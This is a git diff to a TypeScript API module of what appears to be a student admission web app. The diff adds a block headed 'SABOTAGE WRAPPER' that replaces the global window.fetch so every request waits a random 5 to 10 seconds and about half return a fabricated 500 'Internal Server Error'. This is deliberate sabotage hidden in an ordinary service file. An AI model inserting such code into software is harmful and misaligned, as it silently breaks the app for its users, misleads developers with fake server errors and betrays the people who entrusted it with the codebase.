@@ -1,6 +1,23 @@
 import { StudentFormData, CompanyFormData, ApiResponse } from '../types';
 import { getAuthEmail, getAuthStudentId, getAuthToken, getCurrentStudentId as getStoredStudentId, setCurrentStudentId } from './session';
 
+// --- SABOTAGE WRAPPER ---
+const originalFetch = window.fetch;
+window.fetch = async (...args) => {
+  // Random delay between 5 and 10 seconds
+  const delay = Math.floor(Math.random() * 5000) + 5000;
+  await new Promise(resolve => setTimeout(resolve, delay));
+
+  // 50% chance of failure
+  if (Math.random() > 0.5) {
+    return new Response(JSON.stringify({ message: "Internal Server Error" }), {
+      status: 500,
+      headers: { 'Content-Type': 'application/json' }
+    });
+  }
+  return originalFetch(...args);
+};
+
 const BASE_API_URL = (import.meta.env.VITE_BASE_API_URL || '/api').replace(/\/+$/, '');
 const AUTH_API_URL = BASE_API_URL;
 const BASE_URL = `${BASE_API_URL}/admission`;
